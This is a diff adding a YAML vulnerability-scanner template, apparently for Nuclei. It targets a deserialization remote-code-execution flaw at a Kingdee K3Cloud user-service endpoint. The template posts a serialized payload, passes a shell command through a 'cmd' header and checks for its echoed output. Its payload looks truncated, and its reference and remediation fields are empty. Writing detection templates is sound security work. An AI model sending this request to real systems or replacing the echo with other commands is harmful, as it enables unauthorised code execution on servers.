@@ -1,0 +1,54 @@
+id: deserialization
+
+info:
+  name: 反序列化漏洞
+  author: k3ppf0r
+  severity: critical
+  description: |
+    存在远程代码执行漏洞，该漏洞是由于产品需要进行序列化与反序列化，攻击者可以恶意修改传输的反序列化数据，导致执行任意代码执行。
+  reference:
+    - 
+  remediation: |
+    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
+  classification:
+    cve-id: 
+    cvss-score: 9.8
+    cwe-id: CWE-502
+  metadata:
+    date: 
+    version: 
+    fofa-query: 
+  tags: deserialization
+
+variables:
+  str: "{{rand_text_alpha(10)}}"
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/K3Cloud/Kingdee.BOS.ServiceFacade.ServicesStub.User.UserService.SaveUserPassport.common.kdsvc"
+      - "{{BaseURL}}/Kingdee.BOS.ServiceFacade.ServicesStub.User.UserService.SaveUserPassport.common.kdsvc"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+      Accept-Encoding: gzip, deflate
+      Accept-Language: zh-CN,zh;q=0.9
+      Connection: close
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+      cmd: echo {{str}}
+      Content-Type: text/json
+
+    body: |
+      {"ap0":"AAEAAAD////////////++///++AAAACgk++AAAACgk+++AAAACgk+=","format":"3"}
+  
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{str}}"
+        part: body
+        condition: and
+
+      - type: status
+        status:
+          - 200
